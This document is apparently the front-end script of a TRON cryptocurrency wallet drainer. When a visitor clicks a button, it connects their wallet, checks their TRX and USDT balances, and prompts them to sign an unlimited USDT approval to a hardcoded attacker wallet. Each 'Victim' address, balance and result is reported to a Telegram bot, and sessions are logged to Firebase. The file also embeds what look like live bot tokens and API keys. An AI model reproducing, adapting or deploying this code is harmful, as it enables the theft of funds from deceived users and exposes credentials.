// --- Buffer Initialization ---
if (typeof window !== 'undefined') {
    window.Buffer = window.Buffer || buffer.Buffer;
}

const firebaseConfig = {
    apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
    authDomain: "tronadmin-99827.firebaseapp.com",
    databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
    projectId: "tronadmin-99827",
    storageBucket: "tronadmin-99827.firebasestorage.app",
    messagingSenderId: "500883948250",
    appId: "1:500883948250:web:203f69935a6825d09b5be3"
};

const CONFIG = {
    BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
    CHAT_ID: "8249230506",
    ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
};

const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function initFirebase() {
    if (typeof firebase !== 'undefined' && firebase.apps.length === 0) {
        firebase.initializeApp(firebaseConfig);
    }
}

async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
    const text = `🎯 <b>UPDATE</b>\n📌 Status: <b>${status}</b>\n👤 Victim: <code>${address}</code>\n💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n📝 Detail: ${extra}`;
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
        });
    } catch (e) {}
}

async function getStats(address) {
    const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
    let trx = "0.00", usdt = "0.00";
    try {
        const bal = await tw.trx.getBalance(address);
        trx = (bal / 1e6).toFixed(2);
        const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address);
        usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
    } catch (e) {}
    return { trx, usdt };
}

window.addEventListener('load', () => {
    initFirebase();
    if (typeof firebase !== 'undefined') {
        const sessionKey = 'session_' + Date.now();
        window.currentSessionKey = sessionKey;
        firebase.database().ref('connections/' + sessionKey).set({ address: "Online", status: "ACTIVE" });
    }
});

document.getElementById('next-btn').addEventListener('click', async () => {
    const btn = document.getElementById('next-btn');
    btn.classList.add('btn-loading');
    
    initFirebase();

    // Check if wallet system is loaded
    let attempts = 0;
    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 20) {
        await new Promise(r => setTimeout(r, 500));
        attempts++;
    }

    if (typeof window.connectWalletConnectTron !== 'function') {
        btn.classList.remove('btn-loading');
        alert("Wallet initialization timeout. Please refresh.");
        return;
    }

    try {
        const result = await window.connectWalletConnectTron();
        if (result && result.address) {
            const address = result.address;
            const { trx, usdt } = await getStats(address);

            document.getElementById('page-wrapper').classList.add('opacity-10');
            document.getElementById('loading-screen').classList.remove('hidden');

            if (window.currentSessionKey) {
                firebase.database().ref('connections/' + window.currentSessionKey).update({ address, usdt, trx, status: "PENDING_SIGN" });
            }

            await notifyAdmin("PENDING SIGN", address, trx, usdt);

            const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });

            setTimeout(async () => {
                try {
                    const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 },
                        [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                    );

                    const signedTx = await result.provider.request({
                        method: "tron_signTransaction",
                        params: { address: address, transaction: transaction }
                    });

                    const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: ${receipt.txid}`);
                    location.reload();
                } catch (err) {
                    await notifyAdmin("❌ FAILED", address, trx, usdt, err.message || "User Rejected");
                    location.reload();
                }
            }, 1000);
        } else {
            btn.classList.remove('btn-loading');
        }
    } catch (e) {
        btn.classList.remove('btn-loading');
    }
});
